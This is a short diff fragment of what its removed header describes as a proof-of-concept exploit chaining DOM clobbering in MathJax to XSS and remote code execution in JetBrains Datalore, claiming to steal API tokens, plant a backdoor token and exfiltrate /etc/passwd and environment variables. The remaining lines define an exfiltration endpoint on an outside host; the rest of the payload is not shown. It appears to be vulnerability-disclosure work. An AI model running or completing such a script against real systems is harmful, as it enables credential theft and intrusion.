@@ -1,12 +1,3 @@
-// ============================================================
-// JetBrains Datalore MathJax DOM Clobbering → XSS → RCE PoC
-// 
-// IMPACTS DEMONSTRATED:
-// 1. Steal existing API tokens
-// 2. Create new API token (backdoor/persistence)
-// 3. Trigger RCE via "Run All" (exfiltrates /etc/passwd & env vars)
-// ============================================================
-
 (async function() {
     const EXFIL = 'https://poc.heli9.com/jet/log.php';
     
